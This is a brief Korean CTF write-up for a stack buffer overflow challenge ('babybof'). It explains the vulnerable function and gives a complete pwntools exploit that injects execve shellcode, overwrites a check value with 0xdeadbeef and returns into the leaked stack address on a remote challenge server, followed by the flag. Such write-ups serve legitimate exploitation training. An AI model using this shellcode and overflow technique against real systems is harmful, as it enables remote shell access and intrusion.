# babybof
- - - -
문제파일을 보니 main에는 setup과 vuln밖에 없고 실질적인 코드는 vuln에서 진행되었다.
* vuln
```
__int64 vuln()
{
  char buf; // [rsp+0h] [rbp-30h]
  int v2; // [rsp+2Ch] [rbp-4h]

  printf("Here is gift: %p\n", &v2);
  printf("input> ");
  read(0, &buf, 0x100uLL);
  if ( v2 != -559038737 )
  {
    puts("nop!");
    exit(1);
  }
  return 0LL;
}
```
rbp-4의 주소를 leak해주고 buf에 0x100바이트 만큼 read를 해서 overflow를 발생 시킨다. 이후 rbp-4의 값이 -559038737(0xdeadbeef)인지 확인 후 return을 한다.
간단하게 쉘코드를 buf에 넣고 rbp-4 부분에 0xdeadbeef 를 넣은 후 leak된 값에서 buf의 위치를 계산해서 이 위치값을 ret해주면 된다.


## payload
- - - -
```
from pwn import *

#p = process("./babybof")
p = remote("121.142.206.70", 40000)

p.recvuntil("gift: ")
leak =int(p.recvline()[:-1],16)
leak = leak - 44

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload=""
payload+= shellcode
payload+="\x90"*(44-len(payload))
payload+=p32(0xdeadbeef)
payload+="b"*8
payload+= p64(leak)

p.recvuntil("input> ")
p.send(payload)

p.interactive()
```


## flag
- - - -
flag{nice_basic_bof}

#CTF/IGRUS/pwn